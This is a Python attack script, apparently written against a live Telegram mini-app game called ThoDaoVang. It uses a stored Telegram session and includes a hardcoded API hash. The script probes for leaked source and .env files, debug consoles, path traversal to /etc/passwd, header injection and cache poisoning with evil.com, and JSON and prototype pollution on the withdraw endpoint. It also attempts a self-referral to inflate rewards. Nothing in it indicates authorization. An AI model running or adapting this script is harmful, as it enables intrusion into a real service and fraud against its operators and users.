"""
Full attack surface ThoDaoVang.
KHONG withdraw, KHONG doi bank.
"""
import sys, os, time, asyncio, json, socket, threading, random
from concurrent.futures import ThreadPoolExecutor, as_completed
sys.path.insert(0, os.getcwd())
import httpx, storage
storage.init()

BASE = "https://result-gotta-responsibility-firewire.trycloudflare.com"
UA = {"User-Agent":"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Mobile Safari/537.36",
      "Origin":BASE, "Referer":BASE+"/", "content-type":"application/json"}

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import RequestWebViewRequest
from urllib.parse import unquote

fox = [a for a in storage.list_accounts() if a.get("uid") == 8249205817][0]
async def fetch_idata():
    c = TelegramClient(StringSession(fox["session"]), 2040, "b18441a1ff607e10a989891a5462e627")
    await c.connect()
    try:
        bot = await c.get_entity("ThoDaoVang_bot")
        res = await c(RequestWebViewRequest(peer=bot, bot=bot, platform="android",
            url=BASE+"/", from_bot_menu=True, compact=True))
        fr = res.url.split("#tgWebAppData=",1)[1].split("&tgWebAppVersion")[0]
        return unquote(fr)
    finally:
        await c.disconnect()

idata = asyncio.new_event_loop().run_until_complete(fetch_idata())
H = {**UA, "X-Telegram-Init-Data": idata}
print(f"[+] auth len={len(idata)}")

# ============ 1. FLASK DEBUG / SOURCE LEAK ============
print("\n=== 1. FLASK RECON ===")
paths = [
    "/.git/config", "/.git/HEAD", "/backup.zip", "/app.py", "/main.py",
    "/server.py", "/api/source", "/api/debug", "/api/debug/routes",
    "/debug", "/console", "/__debugger__", "/admin", "/administrator",
    "/static/../app.py", "/static/..%2fapp.py", "/static/%2e%2e/app.py",
    "/api/__init__", "/api/admin", "/api/admin/users", "/api/admin/stats",
    "/robots.txt", "/sitemap.xml", "/.env", "/.env.example",
    "/api/health", "/health", "/api/status", "/api/routes", "/api/urls",
    "/api/env", "/api/secret", "/api/keys", "/api/db", "/api/sql",
    "/static/", "/static/index.html", "/index.html", "/main.js",
]
for p in paths:
    try:
        r = httpx.get(BASE+p, headers=H, timeout=8, follow_redirects=False)
        if r.status_code not in (404,):
            body = r.text[:200].replace("\n"," ")
            print(f"    {p:<32} -> {r.status_code}  {body[:180]}")
    except Exception:
        pass

# ============ 2. FINGERPRINT ============
print("\n=== 2. FINGERPRINT ===")
r = httpx.get(BASE+"/api/me", headers=H, timeout=10)
for h in ["server","x-powered-by","x-frame-options","set-cookie","content-type",
          "x-cloudflare","cf-ray","server-timing","via","x-amz-","date"]:
    v = r.headers.get(h)
    if v: print(f"    {h}: {v}")

# ============ 3. OPTIONS / METHOD ENUM ============
print("\n=== 3. METHOD ENUM ===")
for m in ["GET","POST","PUT","PATCH","DELETE","OPTIONS","HEAD","TRACE","CONNECT"]:
    try:
        r = httpx.request(m, BASE+"/api/me", headers=H, timeout=8)
        allow = r.headers.get("allow","-")
        print(f"    {m:<8} -> {r.status_code}  allow={allow}")
    except Exception as e:
        print(f"    {m:<8} -> err {str(e)[:40]}")

# ============ 4. PATH TRAVERSAL / LFI ============
print("\n=== 4. PATH TRAVERSAL ===")
for p in [
    "/api/me/../../../etc/passwd",
    "/api/me/..%2f..%2f..%2fetc%2fpasswd",
    "/static/../../../etc/passwd",
    "/static/..%2f..%2f..%2fetc%2fpasswd",
    "/api/file?name=../../../etc/passwd",
    "/api/read?file=../../../etc/passwd",
    "/api/load?path=../../../etc/passwd",
]:
    try:
        r = httpx.get(BASE+p, headers=H, timeout=8)
        if r.status_code not in (404,400):
            print(f"    {p} -> {r.status_code}  {r.text[:150]}")
    except: pass

# ============ 5. TELEGRAM INITDATA MANIPULATION ============
print("\n=== 5. INITDATA MANIPULATION ===")
# Lay user_id va hash
from urllib.parse import parse_qsl
parts = dict(parse_qsl(idata))
my_uid = parts.get("user")
print(f"    my user: {my_uid[:60]}")

# Thu multiple init-data headers
for hdrs in [
    {"X-Telegram-Init-Data": idata, "x-telegram-init-data": idata},
    {"X-Telegram-Init-Data": "user={}"},
]:
    try:
        r = httpx.get(BASE+"/api/me", headers={**UA, **hdrs}, timeout=8)
        print(f"    {list(hdrs.keys())} -> {r.status_code}")
    except: pass

# ============ 6. JSON POLLUTION / DUPLICATE KEYS ============
print("\n=== 6. JSON POLLUTION ===")
import json as js
tests = [
    '{"amount":2000,"amount":100000}',
    '{"amount":2000,"amount":"abc"}',
    '{"amount":true}',
    '{"amount":null}',
    '{"amount":[2000]}',
    '{"amount":{"val":2000}}',
    '{"amount":2000,"__proto__":{"admin":true}}',
    '{"amount":1e309}',
    '{"amount":NaN}',
    '{"amount":Infinity}',
    '{"amount":-Infinity}',
    '{"amount":2000.00000001}',
    '{"amount":2000.99999999}',
    '{"amount":-0}',
]
for t in tests:
    try:
        r = httpx.post(BASE+"/api/withdraw",
                       content=t.encode(),
                       headers={**H, "content-type":"application/json"},
                       timeout=10)
        body = r.text[:150].replace("\n"," ")
        # Chi in neu khac 400 amount-too-small
        if "tối thiểu" not in body and "không hợp lệ" not in body:
            print(f"    {t:<45} -> {r.status_code}  {body}")
    except Exception as e:
        print(f"    {t} err {str(e)[:60]}")

# ============ 7. HEADER INJECTION ============
print("\n=== 7. HEADER INJECTION ===")
for hdrs in [
    {"X-Forwarded-Host": "evil.com"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-HTTP-Method-Override": "DELETE"},
    {"X-Method-Override": "PUT"},
    {"X-Override-URL": "/api/admin"},
    {"CF-Connecting-IP": "127.0.0.1"},
]:
    try:
        r = httpx.get(BASE+"/api/me", headers={**H, **hdrs}, timeout=8)
        if r.status_code != 200:
            print(f"    {hdrs} -> {r.status_code}  {r.text[:150]}")
    except: pass

# ============ 8. CACHE POISONING ============
print("\n=== 8. CACHE POISONING ===")
for hdrs in [
    {"X-Forwarded-Host": "evil.com"},
    {"X-Host": "evil.com"},
    {"X-Forwarded-Server": "evil.com"},
]:
    try:
        r = httpx.get(BASE+"/api/config", headers={**H, **hdrs}, timeout=8)
        print(f"    {hdrs} -> {r.status_code}  {r.text[:120]}")
    except: pass

# ============ 9. REFERRAL BYPASS via BOT ============
print("\n=== 9. REFERRAL via Telethon /start ===")
# Gui /start ref_0000000256 tu 1 acc khac (neu co)
accs = storage.list_accounts()
print(f"    tong acc: {len(accs)}")
# Chi co FOX — thu tu minh xem sao
async def try_self_ref():
    c = TelegramClient(StringSession(fox["session"]), 2040, "b18441a1ff607e10a989891a5462e627")
    await c.connect()
    try:
        bot = await c.get_entity("ThoDaoVang_bot")
        # Gui /start ref_0000000256
        await c.send_message(bot, "/start ref_0000000256")
        print(f"    da gui /start ref_0000000256 tu chinh FOX")
    finally:
        await c.disconnect()
asyncio.new_event_loop().run_until_complete(try_self_ref())
time.sleep(5)
ref2 = httpx.get(BASE+"/api/referral", headers=H, timeout=10).json()
print(f"    sau khi tu ref: {ref2}")

# ============ 10. SSE / WEBSOCKET ============
print("\n=== 10. SSE / WS ===")
for p in ["/api/events", "/api/stream", "/api/sse", "/events", "/sse", "/ws", "/socket"]:
    try:
        r = httpx.get(BASE+p, headers=H, timeout=5)
        if r.status_code != 404:
            print(f"    {p} -> {r.status_code}  {r.text[:100]}")
    except Exception:
        pass

# ============ 11. FINAL ME ============
print("\n=== 11. FINAL ===")
me = httpx.get(BASE+"/api/me", headers=H, timeout=10).json()
print(f"    balance: {me.get('balance'):,.0f}")
print(f"    referrals: {me.get('referrals')}")
